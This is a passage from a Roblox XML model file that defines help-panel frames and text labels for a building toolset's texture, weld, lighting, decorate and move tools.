												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">TEXTURE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXCAD1A42B9F824647AAC47952E070AF31">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">WeldInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXFAB935AD107C4AD19C375F6E9F7D0B17">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>240</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXE0DAF5EE985D47D99C52764DB7426361">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX4F653E174C864EDF9958B8444650B503">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>200</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Allows you to weld parts together so that they'll move together.

NOTE: The welds between parts may break if you only move one of the parts (move all of the parts that are connected by welds to prevent this).]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXDFF3F1578B0B4D7DA578074E003A6831">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">WELD TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXB53FEE6BC59A4919A0AA5238D62FEA5B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">LightingInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX83DD24D4949A4D01ADC30BBF4D218B3E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>100</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX772FE235AE994A2EB714AC4D53BA4CF9">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX5DE4B0868BA748DBB8C45761AD2E2658">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>200</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to add spotlights or point lights to parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX81340914A319462C85422D3A52195985">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">LIGHTING TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXF647148F92964505BF236CB1FB286B90">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">DecorateInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX710E45598B124476BCE547BE22A2DDFF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>100</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX0861FD405F774A0A8A24A654F332AD77">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX20B1B4BC333E41108C88BB5089D32F2B">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>200</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to add smoke, fire, and sparkles to parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX334C6549AE774CD48FB76E3ADA9F6491">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">DECORATE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXE07C4F6538F54D5F9541712E2689F2ED">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">MoveInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX95AD30DF90ED4B4BB7A19922DC90BAFE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>500</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXD21E51E8AB7143A8AF48956BCC34302B">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">AxesInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>60</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>300</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBXD11E99CB5F134015A9E87FC18466D4FB">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294945280</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Frame</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>83</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>2</XO>
														<YS>0</YS>
														<YO>123</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX3FA379602D6540AEA99BFF3F0960728E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>17</XO>
														<YS>0</YS>
														<YO>83</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>180</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text"><![CDATA[GLOBAL - Normal

LOCAL - Relative to each part

LAST - Relative to the last part selected]]></string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX1FA8EDA252D049E9A60DA302D54F48C8">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>60</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">This option lets you choose in which direction to move each part.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
